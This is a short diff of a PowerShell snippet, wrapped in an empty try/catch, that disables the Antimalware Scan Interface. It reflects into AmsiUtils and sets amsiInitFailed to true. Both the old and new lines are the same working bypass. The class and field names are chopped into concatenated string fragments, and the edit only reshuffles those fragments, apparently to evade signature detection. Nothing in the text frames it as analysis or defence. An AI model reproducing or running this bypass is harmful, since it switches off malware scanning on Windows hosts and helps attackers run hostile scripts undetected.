@@ -1,6 +1,6 @@
 Try
 {
-	[Ref].Assembly.GetType('Sys'+'tem.Man'+'agement.Au'+'tomation.Am'+'siUt'+'ils').GetField('ams'+'iIni'+'tFailed','NonPu'+'blic,Sta'+'tic').SetValue($null,$true)
+[Ref].Assembly.GetType('Sys'+'tem.Mana'+'gement.Aut'+'omatio'+'n.Am'+'siUtils').GetField('am'+'siInitFai'+'led','NonP'+'ublic,Static').SetValue($null,$true)
 }
 Catch
 {}
